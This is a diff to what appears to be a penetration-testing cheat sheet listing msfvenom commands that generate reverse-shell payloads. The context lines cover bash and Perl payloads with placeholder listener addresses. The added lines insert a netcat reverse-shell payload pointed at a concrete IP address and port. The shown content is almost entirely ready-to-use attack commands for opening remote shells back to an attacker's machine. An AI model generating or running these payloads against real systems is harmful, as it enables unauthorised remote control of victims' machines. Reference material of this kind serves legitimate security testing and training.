@@ -90,6 +90,8 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Co
 ## Perl
 msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
 
+## nc
+msfvenom -p cmd/unix/reverse_netcat  LHOST=10.11.19.217 LPORT=7890  > shell.bin
 
 # Shellcode
 For all shellcode see 'msfvenom --help-formats' for information as
